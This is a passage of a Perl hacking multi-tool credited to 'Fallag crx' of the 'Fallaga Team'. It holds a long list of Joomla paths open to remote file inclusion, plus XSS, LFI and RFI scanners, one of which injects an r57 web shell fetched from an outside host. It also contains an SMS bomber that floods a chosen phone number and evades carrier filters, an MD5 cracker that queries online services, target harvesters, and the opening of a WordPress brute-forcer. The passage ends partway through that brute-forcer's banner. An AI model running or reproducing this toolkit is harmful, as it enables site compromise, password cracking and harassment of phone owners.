"/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=",
"/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=",
"/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=",
"/index.php?option=com_custompages&cpage=",
"/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=",
"/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=",
"/components/com_facileforms/facileforms.frame.php?ff_compath=",
"/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=",
"/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=",
"/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=",
"/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=",
"/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=",
"/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=",
"/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=",
"/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=",
"/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=",
"/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=",
"/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=",
"/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=",
"/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=",
"/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=",
"/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=",
"/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=",
"/components/com_joomlaboard/file_upload.php?sbp=",
"/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=",
"/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=",
"/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=",
"/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=",
"/modules/mod_as_category.php?mosConfig_absolute_path=",
"/components/com_articles.php?absolute_path=",
"/classes/html/com_articles.php?absolute_path=",
"/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=",
"/templates/be2004-2/index.php?mosConfig_absolute_path=",
"/libraries/pcl/pcltar.php?g_pcltar_lib_dir=",
"/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=",
"/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=",
"/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=",
"/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=",
"/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=",
"/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=",
"/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=",
"/components/com_mp3_allopass/allopass.php?mosConfig_live_site=",
"/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=",
"/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=",
"/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/com_color/admin.color.php?mosConfig_live_site=",
"/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=",
"/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=",
"/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=",
"/index.php?option=com_adsmanager&mosConfig_absolute_path=",
"/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=",
"/com_magazine_3_0_1/magazine.functions.php?config=",
"/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=",
"/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=",
"/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");


##############################
#XSS

if ($ID==1){

print "\n XSS:";
print "\n\t\t Please Enter Target [http://www.site.com/search.php?id= ";
print "\n\t\t Target:";
$Target=<STDIN>;
chomp ($Target);

foreach $XSS(@XSS){
my $URL = $Target.$XSS;
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ( $URL =~ /Fallaga/ || /HAcked/ || /BHG/ || /XSS/ || /cookie/  ) { $Message ="XSS Vulnerability FOUND";}
else { $Message = "NOT FOUND XSS Vulnerability";}
print "$URL     =>    $Message\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>XSS.txt');
print TEXT "\n$URL   =>   $Message \n\n";
close (TEXT);
}
goto Exit;
}
###############################
#LFI
if ($ID==2){

print "\n\t\t Please Enter Target [http://www.site.com/search.php?id= ";
print "\n\t\t Target:";
$Target=<STDIN>;
chomp ($Target);


foreach $LFI(@LFI){
my $URL = $Target.$LFI;
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { $Message ="LFI Vulnerability FOUND";}
else { $Message = "NOT FOUND LFI Vulnerability";}
print "$URL     =>    $Message\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>LFI.txt');
print TEXT "\n$URL   =>   $Message \n\n";
close (TEXT);
}

}
#################################
if ($ID==3){

print "\t\tPlease Enter Target [http://www.site.com]";
print "\n\n \t Target:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t\t  please Enter Shell Link:";  #May Can help you : http://www.mcrracecars.co.uk/images/r57.txt
$Shell =<STDIN>;
chomp ($Shell);
print"\n\n \t\t Please wait";
sleep(2);
print"\n";

foreach $RFI(@RFI){
my $URL =$Target.$RFI.$Shell;
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){ $Message ="RFI Vulnerability FOUND";}
else { $Message = "NOT FOUND RFI Vulnerability";}
print "\n \n \n \n \t \t \t \t FINISH ";
print "\n $URL  =>   $Message \n";
open (TEXT, '>>RFI.txt');
print TEXT "\n $URL   =>   $Message \n\n";
close (TEXT);

}

}
#################################
#XSS & LFI
if ($ID==4){

print "\t\tPlease Enter Target [http://www.site.com]";
print "\n\n \t Target:";
$Target=<STDIN>;
chomp ($Target);
print "\n\t\t  please Enter Shell Link:";  #May Can help you : http://www.mcrracecars.co.uk/images/r57.txt
$Shell =<STDIN>;
chomp ($Shell);
print"\n\n \t\t Please wait";
sleep(2);
print"\n";


foreach $XSS(@XSS){
my $URL = $Target.$XSS;
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ( $URL =~ /Fallaga/ || /HAcked/ || /BHG/ || /XSS/ || /cookie/  ) { $Message ="Vulnaravel a XSS";}
else { $Message = "NOT FOUND XSS Vulnerability";}
print "$URL     =>    $Message\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>ALL.txt');
print TEXT "\n$URL   =>   $Message \n\n";
close (TEXT);
}

foreach $LFI(@LFI){
my $URL = $Target.$LFI;
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { $Message ="LFI Vulnerability FOUND";}
else { $Message = "NOT FOUND LFI Vulnerability";}
print "$URL     =>    $Message\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>ALL.txt');
print TEXT "\n$URL   =>   $Message \n\n";
close (TEXT);
if ($ID==5) {exit;}
Exit:
exit;
system("pause");
}
}}
}
if($targett eq '6')
{
system('cls');
system('title Joomla Component Scanner');
package control;
use LWP::UserAgent;
use LWP::Simple;
use strict;
use warnings;
use threads;
use threads::shared;
use Config;
use HTML::TreeBuilder;
use HTML::Element;



$Config{useithreads} or die('Recompile Perl with threads to run this program.'); #thread(enabled) check


print"**********************************************************\n";
print"*************************SMS BoMbEr***********************\n";
print"************************By: Fallag crx**********************\n";
print"**********************************************************\n";

##getting inputs, need to get rid of whitespace and or \n character with chomp();
print"Enter the number you want to bomb: \n";
chomp(my $phoneNum = <STDIN>);

print "Enter your carrier (AT&T=41|Verizon=203|Sprint=176): \n";
chomp(my $carrier = <STDIN>);

print "How many messages?: \n";
chomp(my $amountOfMessages = <STDIN>);

print "Enter your email: \n";
chomp(my $from = <STDIN>);

print "Enter your subject: \n";
chomp(my $subject = <STDIN>);

print "Enter your SMS MSG: \n";
chomp(my $message = <STDIN>);

print "**********************************************************\n";
print "**BOMBING\n";
my $numOfBombsSent :shared = 0;
my $inc :shared = 0;
$inc = 10000; #incrementing variable used for carriers that sort messages by email instead of phone #
&main;

sub main{
        while($numOfBombsSent<$amountOfMessages){
                &checkAndBypassEmailFilter;
                if(($amountOfMessages-$numOfBombsSent)==1){
                        &checkAndBypassEmailFilter;
                        &bomb;
                } else {
                        my $pid = fork();   #fork splits process into two
                        if($pid){      #immediately have to handle both ($pid,0) <-child and ($pid) <- parent **parent
                                if($numOfBombsSent<$amountOfMessages){
                                        &checkAndBypassEmailFilter;                             #has to make sure that child is done executing before it finishes. or else child will
                                        &bomb; #parent                                                  #become a zombie
                                }
                                waitpid($pid, 0);
                        } elsif($pid == 0){
                                if($numOfBombsSent<$amountOfMessages){
                                        &checkAndBypassEmailFilter;
                                        &bomb; #child
                                }
                        } else {
                                die "Fork failed";
                        }
                }
        }
}

sub checkAndBypassEmailFilter{
        if($carrier==203 or $carrier==176){ #this is for some carriers that organize based on the email function (thus not getting the full bomb effect)
                                                                                #so this increments their email by one each time to start a new convo :D gotcha bitch
                my @email = split('@', $from);
                lock($inc);                                             #locks $inc variable so nothing else can modify it until it's done with it.
                $from = $email[0].$inc++.'@'.$email[1];
        }
}
sub postUrl {
        my $content =
        my($url, $formref) = @_;
        my $ua = new LWP::UserAgent(timeout => 300); # set up a UserAgent object to handle request
        $ua->agent('perlproc/1.0');
        my $response = $ua->post($url, $formref);  #no need to handle the response from server.
        if($response->is_success){
                return $response->content;
        } else {
                return "POST failure";
        }
}
sub Return_Code { #From Saustin's SMS bomber
    my $content = $_[0];
    my $tree = HTML::TreeBuilder->new;
    $tree->parse($content);
    $tree->elementify();

    my @elements = $tree->find("INPUT"); #because they haven't heard of lowercase
    foreach(@elements)
    {
        my $ele = $_;
        if($ele->attr('NAME') eq "code")
        {
            return $ele->attr('value');
        }
    }
}

sub bomb{
        my $url = "http://www.onlinetextmessage.com/send.php";
        my $indexUrl = "http://www.onlinetextmessage.com/";
        my $lwp = get $indexUrl;
        my $code = Return_Code($lwp);
        #print "Code: $code\n";
        my %param = ('carrier' => $carrier, 'code' => $code, 'from' => $from, 'message' => $message, 'number' => $phoneNum,'quicktext' => '','remember' => 'y', 's' => 'Send Message','subject' => $subject);
        &postUrl($url,\%param);
        lock($numOfBombsSent);                  #locks $numOfBombsSent variable so nothing else can modify it until it's done with it.
        $numOfBombsSent++;
        print "Bomb Status: [",($numOfBombsSent),"/",($amountOfMessages),"]\n";
}}
if($targett eq '7')
{
system('cls');
system('title Proxy Grabber');
use strict;
use warnings;
use LWP::UserAgent;

my $useragent = LWP::UserAgent->new();
$useragent->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4");

for (my $i=1;$i<50;$i++) {

        my $respone = $useragent->get("http://proxylist.hidemyass.com/search-226162/"."$i");

        my @list = split (/<td><span><style>/,$respone->content);

        foreach (@list) {
                if ($_ =~ /<html>/) {
                        next;
                }
                my @flag=();
                $_ =~ s/\n//g;
                (my $gflag) = $_ =~ /^(.+)<\/style>/;
                my @aflag = split (/\./, $gflag);

                foreach my $fl (@aflag) {
                        if ((my $result) = $fl =~ /(.?.?.?.)\{display:inline\}/) {
                                push (@flag, $result);
                        }
                }

                my @aspan = split (/span/, $_);

                foreach my $sspan (@aspan) {
                        foreach my $fl (@flag) {
                                if ((my $result) = $sspan =~ /class=\"$fl\">(\.[0-9]+\.|[0-9]+\.|\.[0-9]+|[0-9]+|\.)/) {
                                        print $result;
                                }
                        }
                        if ((my $result) = $sspan =~ /class=\"[0-9]+\">(\.[0-9]+\.|[0-9]+\.|\.[0-9]+|[0-9]+|\.)/) {
                                print $result;
                        }
                        if ((my $result) = $sspan =~ /style=\"display: inline\">(\.[0-9]+\.|[0-9]+\.|\.[0-9]+|[0-9]+|\.)/) {
                                print $result;
                        }
                        if ((my @result) = $sspan =~ /(<\/div>|^>)(\.[0-9]+\.|[0-9]+\.|\.[0-9]+|[0-9]+|\.)/) {
                                print $result[1];
                        }
                        if ((my $result) = $sspan =~ /style>(\.[0-9]+\.|[0-9]+\.|\.[0-9]+|[0-9]+|\.)/) {
                                print $result;
                        }
                }
                (my $port) = $_ =~ /<td>([0-9]+?)<\/td>/;
                print ":$port\n";
        }
}}
if($targett eq '9')
{
system('cls');
system('title Jce Server Scanner');
my $jces;
use LWP::UserAgent;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ag->timeout(10);
print "[+] Jce Server Scanner \n";
print "[+] Coded by fallag crx \n";
print "[+] Enter IP Jce ; Ex : 192.1.1.1 : \n";
chomp ($jces = <STDIN>);
chomp(my $jces = $ARGV[0]);
for ($jces = 1; $jces <= 10000; $i+=10){
$url = "http://www.bing.com/search?q=$jces$i&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){
$link = $1;
if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/){
if ($link !~ /^http:/){$link = 'http://' . "$link" . '/';}
if($link !~ /\"|\?|\=|index\.php/){
print "\n\t $link";
push(@resul,$link);}} }

while($rrs =~ m/<a href=\"?http:\/\/(.*?[\/].*?)\//g){
$link = $1;
if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/){
if ($link !~ /^http:/){$link = 'http://' . "$link" . '/';}
if($link !~ /\"|\?|\=|index\.php/){
print "\n\t $link";
push(@resul,$link);}} }

if ($rrs !~ m/class=\"sb_pagN\"/g){
$total = $#resul+1;
open(TXTS,"<KkK.txt"); chomp(@ar = <TXTS>); close(TXTS); push(@resul,@ar);
open (TXT,">KkK.txt");
foreach(@resul){$c{$_}++;next if $c{$_} > 1;print TXT "$_\n";push(@arq,$_);}
close(TXT);
$arq=$#arq+1;
print "\n\n Total Result $total , total in file $arq\n"; exit;
}}
}
if($targett eq '8')
{
system('title Wordpress Plugin Checker');
use HTTP::Request;
use LWP::UserAgent;
use Term::ANSIColor;
if($^O eq 'MSWin32'){ system('cls'); } else { system('clear'); }
print color "bold yellow";
print '
        __        ______    ____  _             _          ____ _               _
        \ \      / /  _ \  |  _ \| |_   _  __ _(R)_ __    / ___| |__   ___  ___| | _____ _ __
         \ \ /\ / /| |M) | | |E) | | | | |/ _` | |  _ \  | |   |  _ \ /__ \/ __| |/ /__ \  __|
          \ V  V / |  __/  |  __/| | |_| | (D| | | | | | | |___| | | |  __/ (I_|   |  K_/ |
           \_/\_/  |_|     |_|   |_|\__,_|\__, |_|_| |_|  \____|_| |_|\___|\___|_|\_\___|_|
                                          |___/
';
print color "bold red";print "  Writed By : fallag crx

  FAllaga Team

					Grey Hat Boys ...
"; print color "reset";
print "\n\n";
print color "bold blue";print " [+]";print color"reset";print " input target Ex: http://www.Wordpress.com/ \n";
print "\n";
print "\n";
print color "bold blue";print " [+]";print color"reset";print " input target please:    ";
chomp($s=<STDIN>);
print "\n\n";
print "\n";


open(plu_file,"<Plugin_path.txt") or die "Can Not open path file\n";
my @mylist =<plu_file>;
close("plu_file");

foreach $LST(@mylist){

$f=$s.$LST;
my $rQ=HTTP::Request->new(GET=>$f);
my $User_agent=LWP::UserAgent->new();
$User_agent ->agent("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)");
$User_agent->timeout(30);
my $R=$User_agent->request($rQ);
#--------------------
if ($R->content =~ m/Index of/i ||
$R->content =~ m/Directory/i ||
$R->content =~ m/XML/i ||
$R->content =~ m/Fatal error/i ||
$R->content =~ m/Forbidden/i ||
$R->content =~ m/Warning/i) {
print color "bold green";print "\n [+]"; print color "reset"; print " Found ->  $f\n\n";
open(ohh_Plugin,">>Plugins_finded.txt");
print ohh_Plugin "\n$f\n";
}
if($answer =~ m/Error 404/i or $answer =~ m/nothing found/i){
print "[NO] $f\n";
}
else {
print "[NO] $f\n";
}
}}
if($targett eq '10')
{
system('cls');
system('title Md5 Cracker Online');
                    {
use LWP::UserAgent;
use HTTP::Request::Common;

system('cls');
system('title Online Md5 Cracker Edited By Fallag crx');
print "\n\t***********************************\n";
print "\t*      Md5 Cracker Online         *\n";
print "\t*          ReC0ded by Fallag crx    *\n";
print "\t*          Edited By Fallag crx     *\n";
print "\t-      Menu  :                    -\n";
print "\t*          1 - md5 hash           *\n";
print "\t*          2 - md5.txt            *\n";
print "\t***********************************\n";


print "\nSubmit The Menu ~# ";
$pick=<STDIN>;
chop($pick);

if($pick == "1"){
MD5FAIL:
print "\nEnter The hash of MD5 ~# ";
$hash=<STDIN>;
chop($hash);


if (length($hash)==32)
{
print "\n\t\n";
print "\t*Md5 Cracker Online\n";
print "\t*ReCoded By Fallag crx\n";
print "\t*Fallaga Team \n";
print  "\t\n\n";
&next;
} else {
print "\nIt's not Md5! \n\nLook The Menu again!\n\n";
goto MD5FAIL;
}
}


if($pick == "2"){

print "\nPlease Submit The Hash Location ~# ";
$file=<STDIN>;
chop($file);

open(RES,"<","$file");
@lol = <RES>;
close(RES);

foreach $hash(@lol){
print "       \nEnter The Md5 hahs Link:  $hash\n\n";
&next;
}
$url = substr($url, $1 + 13);
open (txt,">>md5.txt");
print txt  $1,"\n";
close(txt);
}
sub next {

$url = "http://www.md5decryption.com/";
$lwp = LWP::UserAgent->new();
$lwp -> agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Decrypt It!"]);

print "1 www.md5decryption.com          ----  ";
if ($request->content =~ /Decrypted Text: <\/b>(.*)<\/font><br\/><center>/)
{
print "Result : $1\n";
} else {
print "Result : Hash not found!\n";
}
$url = "http://tools.kerinci.net/?x=md5";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "search" => "Search"]);

print "2 www.kerinci.net                ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://md5.rednoize.com/?q=$hash&s=md5&go.x=21&go.y=18&go=Search";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$connect = $lwp -> get($url);

print "3 www.md5.rednoize.com           ----  ";
if ($connect->content =~ /<div id="result" >(.*)<\/div>/)
{
print "Result : $1\n";
} else {
print "Result : Hash not found!\n";
}
$url = "http://www.md5online.org/md5-decrypt.html";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Decrypt"]);

print "4 www.md5online.org              ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://www.hashkiller.co.uk/md5-decrypter.aspx";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Submit"]);

print "5 hashkiller.co.uk               ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "https://crackstation.net";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Crack Hashes"]);

print "6 crackstation.net               ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "crackhash.com";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Start Cracking"]);

print "7 crackhash.com                  ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "www.md5.net/md5-cracker/";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "text" => "submit"]);

print "8 www.md5.net                    ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://www.md5this.com/";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "option" => "com_search"]);

print "9 www.md5this.com                ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = "http://www.hash-cracker.com/";
$lwp = LWP::UserAgent->new();
$lwp->agent("Mozilla/5.0 (X11; U; Linux i686 (x86_64); de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8");
$request = $lwp->post($url, ["hash" => $hash, "submit" => "Crack!!"]);

print "10 www.hash-cracker.com          ----  ";
if ($request -> content =~ /not\ found<\/a><\/td><\/tr>/){
print "Result : Hash not found!\n";
} else {
$request -> content =~ /<tr><td>result:<\/td><td>(.+)<\/td><\/tr>/;
print "Result : $1\n";
}
$url = substr($url, $1 + 13);
open (txt,">>md5.txt");
print txt  $1,"\n";
close(txt);
}}
}
if($targett eq '17')
{
system('cls');
system('title Reverse IP');
                    {
use HTTP::Request;
use LWP::UserAgent;
if($^O =~ /Win/){

   system("cls");
   system("color a");
   system("title Reverse D0main YougetSignal By 1337");

}else{

   system("clear");
}
print q{

                           *-------------------------------*
                           |       reverse          ******
                           |    YouGetSignal       ****
                           | result in log.txt    ***
                           *---------------------*
};
print "\n[*]Use Proxy ? (y/n):";
my $chose = <>;
chomp($chose);

if(lc($chose) eq 'y') {
sleep (3);
print "\n\n [+]Put Proxy (ex: 127.0.0.1:80) :";
my $proxy = <>;
chomp($proxy);
print "\n\n[*]Put Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "log.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$ua->proxy('http', 'http://'.$proxy.'');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>log.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*]IP serveur: $1\n";
}
print "\n[+]All website Reversed.\n";
}
if(lc($chose) eq 'n') {

print "\nPut Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "log.txt";
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>log.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*]IP serveur: $1\n";
}
print "\n[+]All website Reversed.\n";
}}
}
if($targett eq '14')
{
system('cls');
system('title Wordpres BruteForce');
                    {
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Cookies;

if($^O =~ /Win/){
system("cls");
}else{
system("clear");
}
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
$ua->cookie_jar(
HTTP::Cookies->new(
file => 'cookies.txt',
autosave => 1
)
);

$target = $ARGV[0];
$user = $ARGV[1];
$wordlist = $ARGV[2];
$wpsub = 'wp-submit';
$redirect = 'http://'.$target.'/wp-admin/';
print "
  Wordpress Bruteforce
                         ^__^
                         (oo)\_________
